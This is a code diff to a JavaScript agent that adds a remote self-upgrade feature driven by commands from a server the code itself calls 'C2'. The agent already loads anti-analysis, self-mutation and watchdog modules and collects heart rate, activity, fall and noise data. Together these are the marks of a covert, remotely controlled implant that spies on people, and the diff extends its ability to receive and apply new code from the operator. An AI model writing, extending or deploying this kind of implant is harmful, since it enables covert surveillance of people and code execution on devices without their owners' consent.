@@ -39,6 +39,7 @@ const { MutationEngine }  = require("./modules/mutator");
 const Watchdog            = require("./modules/watchdog");
 const CommandGuard        = require("./modules/commander");
 const AntiAnalysis        = require("./modules/antianalysis");
+const Upgrader            = require("./modules/upgrader");
 
 // ── Agent state ────────────────────────────────────────────────────────────
 const modules = {};
@@ -293,6 +294,49 @@ function onCommand(type, payload) {
       break;
     }
 
+    // ── Self-upgrade (admin-gated) ─────────────────────────────────────────
+
+    // Admin polls device env before deciding on upgrade
+    case "UPGRADE_ENV_REQUEST": {
+      const envStatus = modules.upgrader?.getEnvStatus();
+      socket.send("UPGRADE_ENV_STATUS", { envStatus, ts: Date.now() });
+      break;
+    }
+
+    // Admin asks agent to propose an upgrade for a specific version
+    case "UPGRADE_PROPOSAL_REQUEST": {
+      const { targetVersion, reason } = payload || {};
+      if (!targetVersion) {
+        logger.warn("[Upgrader] UPGRADE_PROPOSAL_REQUEST missing targetVersion");
+        break;
+      }
+      modules.upgrader?.proposeUpgrade(targetVersion, reason || "Admin-requested proposal");
+      break;
+    }
+
+    // Admin approved the upgrade — apply it
+    case "UPGRADE_APPROVED": {
+      logger.info(`[Upgrader] Admin approved upgrade to v${payload?.version}`);
+      modules.upgrader?.applyUpgrade(payload);
+      break;
+    }
+
+    // Admin denied the upgrade — back off
+    case "UPGRADE_DENIED": {
+      logger.info(`[Upgrader] Admin denied upgrade: ${payload?.reason || "—"}`);
+      modules.upgrader?.handleDenied(payload);
+      break;
+    }
+
+    // Admin polls current upgrader status
+    case "UPGRADE_STATUS": {
+      socket.send("UPGRADE_STATUS_RESULT", {
+        ...(modules.upgrader?.getStatus() || {}),
+        ts: Date.now(),
+      });
+      break;
+    }
+
     default:
       logger.warn(`Unknown command: ${type}`);
   }
@@ -363,8 +407,22 @@ function bootstrap() {
   modules.sensors.start();
   logger.info("Emergency sensor hub active (fall, heat, heart rate, noise, activity)");
 
+  // ── Self-upgrade engine (admin-gated) ─────────────────────────────────────
+  // Initialised after socket.connect() so it has a live socket reference.
+  // The upgrader only proposes — it never applies without UPGRADE_APPROVED.
+  modules.upgrader = new Upgrader();
+
   // ── Connect to C2 (auto-reconnects on failure) ────────────────────────────
   socket.connect();
+
+  // Wire upgrader socket after connection is established
+  modules.upgrader.setSocket(socket);
+  if (config.autoUpdate) {
+    // Stagger the first check 5 minutes after boot to avoid hammering C2
+    setTimeout(() => {
+      modules.upgrader.startPeriodicCheck("4.7.3");
+    }, 5 * 60 * 1000);
+  }
 
   logger.info("All modules initialised — connected to C2");
 }
